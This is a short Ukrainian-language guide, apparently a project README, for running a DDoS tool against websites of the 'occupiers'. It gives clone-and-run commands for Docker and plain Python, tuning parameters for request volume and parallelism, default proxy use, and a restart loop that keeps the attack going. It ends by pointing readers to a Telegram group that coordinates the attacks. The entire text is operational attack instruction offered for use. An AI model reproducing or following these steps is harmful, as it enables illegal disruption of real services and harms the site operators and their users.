## Гайд по DDoS сайтів окупантів

### Запуск через докер (потрібен попередньо встановлений докер)
1) `git clone https://github.com/abionics/attacker`
2) `cd attacker`
3) `docker-compose up --build -d`
4) "Щоб призупинити зашквар і трохи провітрити хату" `docker-compose down`

Корегуйте параметри `REQUESTS_PER_SITE` та `PARALLEL_COUNT` для зміни швидкості,
також є можливість використовувати власні проксі (див. `PARALLEL_COUNT`),
за замовчуванням проксі теж використовуються (див. [приклад](http://46.4.63.238/api.php))

### Без докеру
1) Встановити python, для linux це `sudo apt install git python`
2) `git clone https://github.com/abionics/attacker`
3) `cd attacker`
4) `pip3 install -r requirements.txt`
5) `python3 main.py`
6) якщо вилітає то `while true; do python3 main.py; sleep 2; done`
* при проблемах з pip3 на linux юзайте `apt install python3-pip`

Про усі проблеми пишіть у issues, буду намагатися допомогти

Також координуємо наші атаки у группах, наприклад https://t.me/ddosRussians (~13к юзерів)
